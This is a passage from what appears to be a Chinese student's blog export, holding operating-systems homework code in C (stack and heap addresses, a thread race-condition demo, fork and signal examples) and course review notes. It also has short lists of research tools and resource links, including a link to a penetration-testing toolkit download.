<span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 栈空间向高地址方向增长（非典型情况）\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 堆分析</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"【堆分析】\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"堆变量 1 地址: %p\n"</span>, (<span class="type">void</span>*)heap_var1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"堆变量 2 地址: %p\n"</span>, (<span class="type">void</span>*)heap_var2);</span><br><span class="line">    <span class="keyword">if</span> (heap_var1 &lt; heap_var2)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 堆空间向高地址方向增长\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 堆空间向低地址方向增长（非典型情况）\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 比较堆栈的相对位置</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"【总体比较】\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">void</span>*)&amp;stack_var1 &gt; (<span class="type">void</span>*)heap_var1)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 栈区地址高于堆区地址（符合一般内存分布规律）\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 栈区与堆区分布异常，需注意系统实现差异\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(heap_var1);</span><br><span class="line">    <span class="built_in">free</span>(heap_var2);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"作业二第三部分：堆栈内容展示与分析\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> main_stack1, main_stack2;          <span class="comment">// 主线程栈变量</span></span><br><span class="line">    <span class="type">int</span> *main_heap1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)); <span class="comment">// 主线程堆变量1</span></span><br><span class="line">    <span class="type">int</span> *main_heap2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)); <span class="comment">// 主线程堆变量2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n===== 主线程堆栈分析 =====\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 栈分析</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"【栈分析】\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"栈变量 1 地址: %p\n"</span>, (<span class="type">void</span>*)&amp;main_stack1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"栈变量 2 地址: %p\n"</span>, (<span class="type">void</span>*)&amp;main_stack2);</span><br><span class="line">    <span class="keyword">if</span> (&amp;main_stack1 &gt; &amp;main_stack2)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 栈空间向低地址方向增长\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 堆分析</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"【堆分析】\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"堆变量 1 地址: %p\n"</span>, (<span class="type">void</span>*)main_heap1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"堆变量 2 地址: %p\n"</span>, (<span class="type">void</span>*)main_heap2);</span><br><span class="line">    <span class="keyword">if</span> (main_heap1 &lt; main_heap2)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 堆空间向高地址方向增长\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对比堆栈总体位置</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"【总体比较】\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">void</span>*)&amp;main_stack1 &gt; (<span class="type">void</span>*)main_heap1)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 栈区地址高于堆区地址（符合一般规律）\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建两个线程对比堆栈空间</span></span><br><span class="line">    <span class="type">pthread_t</span> thread1, thread2;</span><br><span class="line">    <span class="type">int</span> id1 = <span class="number">1</span>, id2 = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;thread1, <span class="literal">NULL</span>, thread_function, &amp;id1);</span><br><span class="line">    pthread_create(&amp;thread2, <span class="literal">NULL</span>, thread_function, &amp;id2);</span><br><span class="line"></span><br><span class="line">    pthread_join(thread1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(thread2, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(main_heap1);</span><br><span class="line">    <span class="built_in">free</span>(main_heap2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n所有线程堆栈分析完毕。\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>任务四：多线程修改共享变量结果展示与分析</p><p>（通过多次运行该程序，还会得到不同的最终结果，进一步验证了线程调度的随机性和操作结果的不确定性。）</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> shared_value = <span class="number">0</span>;  <span class="comment">// 共享变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程1：增加共享变量</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_add</span><span class="params">(<span class="type">void</span> *arg)</span> {</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) {</span><br><span class="line">        <span class="type">int</span> temp = shared_value;  <span class="comment">// 读取共享变量</span></span><br><span class="line">        usleep(rand() % <span class="number">2000</span>);    <span class="comment">// 随机延迟，增加调度随机性</span></span><br><span class="line">        temp = temp + <span class="number">1</span>;          <span class="comment">// 执行加操作</span></span><br><span class="line">        usleep(rand() % <span class="number">2000</span>);</span><br><span class="line">        shared_value = temp;      <span class="comment">// 写回共享变量</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"线程1(+1) 第%d次操作后: shared_value = %d\n"</span>, i + <span class="number">1</span>, shared_value);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程2：减少共享变量</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_sub</span><span class="params">(<span class="type">void</span> *arg)</span> {</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) {</span><br><span class="line">        <span class="type">int</span> temp = shared_value;  <span class="comment">// 读取共享变量</span></span><br><span class="line">        usleep(rand() % <span class="number">2000</span>);    <span class="comment">// 随机延迟，增加调度随机性</span></span><br><span class="line">        temp = temp - <span class="number">1</span>;          <span class="comment">// 执行减操作</span></span><br><span class="line">        usleep(rand() % <span class="number">2000</span>);</span><br><span class="line">        shared_value = temp;      <span class="comment">// 写回共享变量</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"线程2(-1) 第%d次操作后: shared_value = %d\n"</span>, i + <span class="number">1</span>, shared_value);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"作业二第四部分：多线程共享变量与调度随机性分析\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> t1, t2;</span><br><span class="line">    srand((<span class="type">unsigned</span>)time(<span class="literal">NULL</span>));  <span class="comment">// 初始化随机数种子</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"初始值: shared_value = %d\n"</span>, shared_value);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建两个线程：一个加，一个减</span></span><br><span class="line">    pthread_create(&amp;t1, <span class="literal">NULL</span>, thread_add, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;t2, <span class="literal">NULL</span>, thread_sub, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待两个线程执行完毕</span></span><br><span class="line">    pthread_join(t1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t2, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n所有操作结束。\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"最终值: shared_value = %d (理论期望值: 0)\n"</span>, shared_value);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"说明：由于线程交替运行的随机性，结果可能与期望不同。\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机基础课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课程学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>科研资料整理收集工具</title>
      <link href="/2025/10/16/%E7%A7%91%E7%A0%94%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/"/>
      <url>/2025/10/16/%E7%A7%91%E7%A0%94%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h2 id="🌟-1-好用的ai工具"><a href="#🌟-1-好用的ai工具" class="headerlink" title="🌟 1 好用的ai工具"></a>🌟 1 好用的ai工具</h2><p><a href="https://www.bohrium.com/journal-library">https://www.bohrium.com/journal-library</a></p><h2 id="🌟-2-翻译工具"><a href="#🌟-2-翻译工具" class="headerlink" title="🌟 2 翻译工具"></a>🌟 2 翻译工具</h2><p>英文翻译好用软件：小绿鲸</p><p>翻译插件：沉浸式翻译<br><a href="https://immersivetranslate.cn/">https://immersivetranslate.cn/</a></p><p>官网有使用教程，简单易安装，可以用于快速理解文章内容、筛选信息</p><h2 id="🌟-3-信息检索资料"><a href="#🌟-3-信息检索资料" class="headerlink" title="🌟 3 信息检索资料"></a>🌟 3 信息检索资料</h2><table><thead><tr><th align="left">微信公众号</th><th align="left">主要方向</th><th align="left">推荐程度及理由</th></tr></thead><tbody><tr><td align="left">安全研究GoSSIP</td><td align="left">智安领域，主要面向安全</td><td align="left"><strong>优</strong>，会推荐一些比较先进的论文</td></tr><tr><td align="left">Coder小Q</td><td align="left">密码领域</td><td align="left"><strong>一般</strong>，倾向于密码领域知识的科普</td></tr><tr><td align="left">苏州信息安全法学所</td><td align="left">网安、密码、法律</td><td align="left"><strong>一般</strong>，主要倾向于网安、密码和法律之间关系的解读及对当下的影响</td></tr><tr><td align="left">凰兮</td><td align="left">密码</td><td align="left"><strong>不推荐</strong>，近期注重对于经典密码算法的讲解</td></tr><tr><td align="left">黑客网络安全</td><td align="left">网安</td><td align="left"><strong>一般</strong>，主要是对网安人员和黑客的事迹介绍以及一些网络安全小技巧分享（通俗易懂）</td></tr><tr><td align="left">ACM计算机学会</td><td align="left">智安等与计算机相关的领域</td><td align="left"><strong>优</strong>，推荐各类计算机赛事信息和具有代表性的获奖论文</td></tr><tr><td align="left">中国信息安全</td><td align="left">智安</td><td align="left"><strong>一般</strong>，主要是聚焦相关政策介绍和专家解读</td></tr><tr><td align="left">XPTY</td><td align="left">密码</td><td align="left"><strong>一般</strong>，介绍各类优秀论文</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他资料 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF竞赛资料整理</title>
      <link href="/2025/10/16/CTF%E7%AB%9E%E8%B5%9B%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/"/>
      <url>/2025/10/16/CTF%E7%AB%9E%E8%B5%9B%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="🌟-1-好用的攻击机镜像资源连接"><a href="#🌟-1-好用的攻击机镜像资源连接" class="headerlink" title="🌟 1 好用的攻击机镜像资源连接"></a>🌟 1 好用的攻击机镜像资源连接</h2><p><a href="https://arch3rpro.github.io/download">矛盾武器库</a></p><p>矛·盾 武器库 v3.2<br>Pentest-Windows<br>一个开箱即用的windows渗透测试环境<br>首个适配Mac M芯片的武器库</p><hr><p>本文档会持续更新，谢谢关注～</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他资料 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>校园资料整理</title>
      <link href="/2025/10/16/%E6%A0%A1%E5%9B%AD%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/"/>
      <url>/2025/10/16/%E6%A0%A1%E5%9B%AD%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="🌟-1-大创项目经费使用及报销流程"><a href="#🌟-1-大创项目经费使用及报销流程" class="headerlink" title="🌟 1 大创项目经费使用及报销流程"></a>🌟 1 大创项目经费使用及报销流程</h2><p>通过网盘分享的文件：“大创项目”经费使用及报销流程(2025).doc<br>链接: <a href="https://pan.baidu.com/s/1gciprfjrG1TLMQLIPXLNEw?pwd=xub3">https://pan.baidu.com/s/1gciprfjrG1TLMQLIPXLNEw?pwd=xub3</a> 提取码: xub3<br>–来自百度网盘超级会员v5的分享</p><hr><p>本文档会持续更新</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他资料 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统章节笔记</title>
      <link href="/2025/10/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AB%A0%E8%8A%82%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/10/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AB%A0%E8%8A%82%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="🌲操作系统章节复习"><a href="#🌲操作系统章节复习" class="headerlink" title="🌲操作系统章节复习"></a>🌲操作系统章节复习</h1><h2 id="🌟-第一章基础知识"><a href="#🌟-第一章基础知识" class="headerlink" title="🌟 第一章基础知识"></a>🌟 第一章基础知识</h2><ol><li>OS作为用户与计算机硬件系统之间的接口。OS处于用户和计算机硬件系统之间，用户通过OS来使用计算机系统。用户可以通过以下三种方式使用计算机：命令行；系统调用；图形化</li><li>OS的定义：操作系统是一组控制和管理计算机硬件和软件资源，合理地对各类作业进行调度，以及方便用户使用的程序的集合</li><li>关于操作系统的比喻：魔术师，提供干净、易于使用的物理资源抽象，应用程序的“机器”是由操作系统提供的进程抽象，每个正在运行的程序都在它自己的进程中运行，进程提供了比原始硬件更好的接口。裁判，管理保护、隔离和资源共享，操作系统相互隔离各个过程，操作系统将自己与其他过程隔离开来，即使它们实际上是运行在相同的硬件上！胶水，常见的服务：存储，窗口系统，网络，共享和授权，外观和感觉</li><li>进程：进程是进程实体的运行过程，是系统进行资源分配和调度的一个独立单位。进程是程序的一次执行，进程是一个程序及数据在处理机上顺序执行时所发生的活动。进程=地址空间+线程+与之关联的其他系统状态</li><li>操作系统的发展过程：无操作系统的计算机系统、单道批处理系统、多道批处理系统、分时系统、实时系统。多道批处理系统是操作系统成熟的标志。</li><li>分时系统的特征：多路性、独占性、及时性、交互性</li><li>操作系统的基本特征：并发性、共享性、虚拟性、异步性</li><li>共享：系统中的资源可供内存中多个并发执行的进程共同使用，相应地把这种资源共同使用称为资源共享或称为资源复用。</li><li>临界资源：在一段时间内只允许一个进程访问的资源</li><li>并发和共享是操作系统的两个最基本特征，他们又是互为存在的条件。</li><li>虚拟技术：操作系统中所谓的虚拟，是指通过某种技术把一个物理实体变为若干个逻辑上的对应物。物理实体是实的，即实际存在的，后者是虚的，是用户感觉上的东西。用于实现虚拟的技术称为虚拟技术。</li><li><strong>操作系统的主要功能</strong>：（1）处理机管理功能：进程控制、进程同步、进程通信、调度（2）存储器管理功能：对内存进行分配、保护和扩充、地址映射 （3）设备管理功能：缓冲管理、设备分配、设备处理 （4）文件管理功能：文件存储空间的管理、目录管理、文件的读写管理和保护 （5）操作系统与用户之间的接口：用户接口和程序接口</li></ol><hr><h2 id="🌟-第二章-进程、线程与文件系统"><a href="#🌟-第二章-进程、线程与文件系统" class="headerlink" title="🌟 第二章 进程、线程与文件系统"></a>🌟 第二章 进程、线程与文件系统</h2><h3 id="2-1-四个操作系统基本概念"><a href="#2-1-四个操作系统基本概念" class="headerlink" title="2.1 四个操作系统基本概念"></a>2.1 四个操作系统基本概念</h3><ol><li>线程：单个唯一执行上下文（PC寄存器、数据寄存器、执行标志、堆栈、内存状态）。当线程驻留在处理器寄存器中时，它是在处理器上执行的。当状态未被加载到处理器时，线程被挂起（不执行） ，处理器状态指向其他线程，程序计数器不指向此线程的下一个指令。线程是虚拟内核，时分复用，线程在真正的物理核心，或保存在内存块中（线程控制块TCB），TCB在线程不运行时保留寄存器的内容，TCB现在存储在内核</li><li>地址空间：程序可访问的一组内存地址（用于读取或写入）保护操作系统免受程序攻击：base&amp;bound，重定位，地址空间转换，分页虚拟地址空间</li><li>进程：运行程序的实例（受保护的地址空间+一个或多个线程）权利受限的执行环境，具有一个或者多个线程，拥有内存、文件描述符、套接字，封装一个或多个线程共享过程资源，提供内存保护。线程封装并发，地址空间封装保护，并行性</li><li>双模式操作保护：只有系统才有能力访问某些资源 内核态/用户态 管态/目态。用户内核模式转换：系统调用fopen、中断（硬件触发，如时钟中断、键盘操作）、陷入或异常</li><li>code：代码段，程序的可执行指令，编译后的二进制代码 static data：数据段，已初始化的全局变量和静态变量（如 <code>int global_var = 42;</code>）未初始化的全局/静态变量（BSS段，默认值为0，如 <code>static int uninit_var;</code>） heap：堆，通过malloc或者new等动态分配的内存，如运行时创建的数组、对象、数据结构 stack：栈，函数调用的上下文，局部变量、函数参数、返回地址等</li></ol><h3 id="2-2-并发进程与线程"><a href="#2-2-并发进程与线程" class="headerlink" title="2.2 并发进程与线程"></a>2.2 并发进程与线程</h3><p><img src="/../../../../aimgs/posts/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AB%A0%E8%8A%82%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4.png" alt="虚拟地址空间"></p><ol><li><strong>并发</strong>：多处理器：多个CPU（核心），多道：多个作业/进程，多线程：多个线程/进程</li><li>并发性是同时处理多件事情，并行是同时做多件事情</li><li>进程管理API：exit终止进程 fork复制当前进程 exec更改当前进程运行的程序 wait等待进程完成 kill向其他进程发送信号（中断式通知） sigaction为信号设置处理程序</li><li>基础代码：</li></ol><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">{</span><br><span class="line">  <span class="comment">/* get current processes PID */</span></span><br><span class="line">  <span class="type">pid_t</span> pid = getpid();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"My pid: %d\n"</span>, pid);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> {</span><br><span class="line">  <span class="type">pid_t</span> cpid, mypid;</span><br><span class="line">  <span class="type">pid_t</span> pid = getpid();            <span class="comment">/* get current processes PID */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Parent pid: %d\n"</span>, pid);</span><br><span class="line">  cpid = fork();</span><br><span class="line">  <span class="keyword">if</span> (cpid &gt; <span class="number">0</span>) {     <span class="comment">/* Parent Process */</span></span><br><span class="line">    mypid = getpid();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d] parent of [%d]\n"</span>, mypid, cpid);</span><br><span class="line">  } <span class="keyword">else</span> <span class="keyword">if</span> (cpid == <span class="number">0</span>) {     <span class="comment">/* Child Process */</span></span><br><span class="line">    mypid = getpid();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d] child\n"</span>, mypid);</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    perror(<span class="string">"Fork failed"</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_callback_handler</span><span class="params">(<span class="type">int</span> signum)</span> {</span><br><span class="line">  <span class="built_in">printf</span>(“Caught signal!\n”);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>;</span></span><br><span class="line">  sa.sa_flags = <span class="number">0</span>;</span><br><span class="line">  sigemptyset(&amp;sa.sa_mask);</span><br><span class="line">  sa.sa_handler = signal_callback_handler;</span><br><span class="line">  sigaction(SIGINT, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) {}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol start="5"><li><p>线程掩盖了I/O延迟。</p></li><li><p>线程的三种状态：运行、就绪、阻塞</p></li><li><p>多线程程序：运行可执行程序将创建执行该程序的进程，最初新进程在自己的地址空间中只有一个线程。生成多线程程序的方法：调用<code>pthread_create()</code>创建新线程，指定线程函数和参数，使用<code>pthread_join()</code>等待线程结束，编译时需链接<code>-lpthread</code>库。</p></li><li><p><code>pthread</code> 是一套标准化的C语言线程操作函数库（如 <code>pthread_create</code>, <code>pthread_join</code>），允许程序在单进程内并发执行多个任务，共享进程资源但拥有独立执行流。</p></li><li><p><strong>pthread常用函数包括：</strong></p><ol><li><strong><code>pthread_create()</code></strong> - 创建新线程，需指定线程函数和参数；</li><li><strong><code>pthread_join()</code></strong> - 阻塞等待线程结束并回收资源；</li><li><strong><code>pthread_exit()</code></strong> - 线程主动退出，可返回结果；</li><li><strong><code>pthread_self()</code></strong> - 获取当前线程ID；</li><li>同步控制函数：<ul><li><strong><code>pthread_mutex_init()/lock()/unlock()</code></strong> - 互斥锁保护共享数据；</li><li><strong><code>pthread_cond_wait()/signal()</code></strong> - 条件变量实现线程间通信；</li></ul></li><li><strong><code>pthread_detach()</code></strong> - 设置线程为分离状态，终止后自动回收资源。</li></ol><p><strong>注</strong>：使用时需链接<code>-lpthread</code>库，并注意同步避免竞争条件。</p></li><li><p>竞争与锁：线程之间的协调，通常涉及共享数据。临界区：访问临界资源的代码，一个线程的临界区必须一次执行完，不能中断。</p></li><li><p><strong>线程竞争（Race Condition）</strong>是指多个线程同时访问和修改同一共享资源时，由于执行顺序的不确定性导致程序结果出现错误或不可预测的行为。例如，两个线程同时对一个变量进行自增操作时，可能因线程切换导致部分修改丢失，最终结果不符合预期。<strong>锁（如互斥锁<code>pthread_mutex_t</code>）</strong>是解决竞争的核心机制：它在共享资源被访问前加锁（确保同一时间仅一个线程能操作），操作完成后解锁（允许其他线程访问）。锁强制将并发操作转为串行，保证数据一致性，但过度使用可能降低性能。简单来说，竞争是“乱抢资源引发的混乱”，锁则是“排队使用资源的规则”。</p></li></ol><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_init</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex,     <span class="type">const</span> <span class="type">pthread_mutexattr_t</span> *attr)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_lock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span>;  </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_unlock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span>;</span><br></pre></td></tr></tbody></table></figure><h3 id="2-3-文件与I-O"><a href="#2-3-文件与I-O" class="headerlink" title="2.3 文件与I/O"></a>2.3 文件与I/O</h3><ol><li>对于文件的抽象：在UNIX系统中，<strong>“万物皆文件”</strong> 是其核心设计哲学，此处的“文件”是一个高度抽象的概念，它远不止于磁盘上存储数据的普通文件。本质上，<strong>一切可以被读写操作（read/write）的资源都被抽象成了文件</strong>，并通过统一的<strong>文件描述符（File Descriptor）</strong> 接口进行访问。这包括：存储数据的<strong>普通文件</strong>（-）、提供进程间通信的<strong>管道（pipe, |）</strong> 和<strong>套接字（socket）</strong>、代表硬件设备的<strong>设备文件</strong>（如/dev/sda，分字符c和块设备b）、以及映射进内存的<strong>虚拟文件</strong>（如/proc目录下的文件，它们实际上是内核数据结构接口）。因此，无论是操作硬盘数据、键盘输入、屏幕输出，还是进行网络通信，在UNIX看来，都只是在用<code>open</code>、<code>read</code>、<code>write</code>、<code>close</code>等相同的系统调用对不同的“文件”进行读写，这种极致抽象极大地简化了系统的设计和应用开发。</li><li>POSIX I/O：POSIX I/O 是POSIX标准定义的一组文件输入/输出（Input/Output）系统调用，提供跨UNIX/Linux系统的统一文件操作接口。使用前open，面向字节，显式close</li><li>文件的缓冲机制：<strong>操作系统的文件缓冲机制</strong> 是一种提升I/O效率的核心技术，其核心思想是在<strong>高速的内存（RAM）中开辟一块区域作为缓冲区</strong>，作为慢速的外设（如硬盘）与高速的CPU之间的数据中转站。当进程写入数据时，并不直接写入磁盘，而是先复制到内存缓冲区，由操作系统在后台选择合适的时机（如缓冲区满或定期刷写）再统一写入磁盘，这能将多次零散的小写操作合并为一次大的顺序写操作，极大减少了耗时的磁盘访问次数；读取数据时，操作系统也会预读更多数据到缓冲区，使得后续的读取请求可以直接从内存获取，避免了真实的磁盘寻道。这种机制<strong>以少量的内存空间为代价，通过批处理和预读策略，有效地掩盖了I/O速度的不匹配问题</strong>，显著提升了系统整体性能，但代价是可能带来数据延迟写入的风险（如突然断电可能导致数据丢失）。</li><li><strong>共享文件描述符</strong>是指多个进程（如父子进程通过<code>fork()</code>继承）或线程持有指向<strong>同一个内核文件表项</strong>的描述符编号，这意味着它们不仅共享对底层文件（如普通文件、套接字或管道）的访问权限，更重要的是<strong>共享文件的内部状态</strong>，尤其是<strong>当前读写偏移量</strong>。例如，若进程A通过<code>lseek</code>移动了文件指针，进程B接下来的读操作会从新的位置开始；同理，若两个进程同时写入一个共享描述符指向的文件，它们的输出数据会按写入顺序正确拼接，而不会相互覆盖。这种机制是实现进程间顺序协作通信（如管道）的基础，但也要求使用者注意并发操作的同步问题。</li></ol><hr><h2 id="🌟-第三章-进程管理与进程调度"><a href="#🌟-第三章-进程管理与进程调度" class="headerlink" title="🌟 第三章 进程管理与进程调度"></a>🌟 第三章 